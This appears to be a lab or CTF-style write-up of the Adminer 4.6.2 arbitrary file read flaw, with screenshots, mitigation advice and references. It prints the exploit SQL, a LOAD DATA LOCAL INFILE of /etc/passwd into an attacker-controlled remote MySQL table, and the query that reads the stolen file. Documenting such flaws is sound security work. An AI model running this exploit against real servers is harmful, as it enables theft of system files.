---


---

<h1 id="adminer-4.6.2-file-disclosure-vulnerability">Adminer 4.6.2 file disclosure vulnerability</h1>
<h3 id="severity-high">Severity: High</h3>
<h1 id="description">Description</h1>
<p>Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Improper Access Control in Adminer versions upto 4.6.2 allows an attacker to achieve Arbitrary File Read on the server by connecting a remote MySQL database to the Adminer.</p>
<h2 id="affected-url">Affected URL</h2>
<p><a href="http://13.233.168.80:31337/adminer.php">http://13.233.168.80:31337/adminer.php</a></p>
<h2 id="risk-rating">Risk Rating</h2>
<ul>
<li>Severity: High</li>
<li>Difficulty to Exploit: Medium</li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/YTsR4xX/1.jpg" alt="1" border="0"></a></p>
<p>In order to hack into a system, we need to first gather some information about it. For that, I use ZAP tool for the process of enumeration.</p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/P97mLpp/2.jpg" alt="2" border="0"></a></p>
<p>I discovered that Adminer version 4.6.2 is  running here.</p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/v1ywhxN/4.jpg" alt="4" border="0"></a></p>
<p>I first set up our own MySQL server to connect to Adminer.</p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/BVtY11t/5.jpg" alt="5" border="0"></a></p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/nmzMrMc/6.jpg" alt="6" border="0"></a></p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/PT68WjD/7.jpg" alt="7" border="0"></a></p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/ZdhYNvV/8.jpg" alt="8" border="0"></a></p>
<p><a href="https://imgbb.com/"><img src="https://i.ibb.co/pfJ8tF3/10.jpg" alt="10" border="0"></a></p>
<p>I was unable to configure MySQL settings (specifically the ‘bind-address’) to allow remote connections. This is crucial as I need to access the Adminer login page and connect to a remote MySQL database that I (attacker) control. I have included the details of the exploitation process from <a href="https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/">https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/</a>.</p>
<p>In order to exploit this vulnerability, an attacker needs to access the login page of Adminer and connect back to a remote MySQL database he controls:</p>
<p><a href="https://ibb.co/HHgQY49"><img src="https://i.ibb.co/ZMTCKXb/12.jpg" alt="12" border="0"></a></p>
<p>After this, the attacker goes to the “SQL Command” page on the Adminer:</p>
<p><a href="https://ibb.co/t8XDPwQ"><img src="https://i.ibb.co/724KNxj/13.jpg" alt="13" border="0"></a><br>
With the following SQL command, the attacker can read a local file on the Adminer server line and load it into his remote database:</p>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">LOAD</span> <span class="token keyword">DATA</span> <span class="token keyword">local</span> <span class="token keyword">INFILE</span> <span class="token string">'/etc/passwd'</span> <span class="token keyword">INTO</span> <span class="token keyword">TABLE</span> lfr_sink_table <span class="token keyword">fields</span> <span class="token keyword">TERMINATED BY</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

</code></pre>
<p><a href="https://ibb.co/TvHJkFz"><img src="https://i.ibb.co/mDHdGMQ/14.jpg" alt="14" border="0"></a></p>
<p>Once this is done, the attacker can view the contents of the read file with  <code>SELECT * FROM lfr_sink_table;</code>:</p>
<p><a href="https://ibb.co/X8vMPbW"><img src="https://i.ibb.co/Zmk7rVf/16.jpg" alt="16" border="0"></a></p>
<h2 id="mitigations">Mitigations</h2>
<p>Upgrade to the latest version of Adminer. This vulnerability was fixed in Adminer version <strong>4.6.3</strong></p>
<h2 id="references">References</h2>
<ul>
<li>
<p>[1] <a href="">https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/</a></p>
</li>
<li>
<p>[2] <a href="">https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/</a></p>
</li>
</ul>

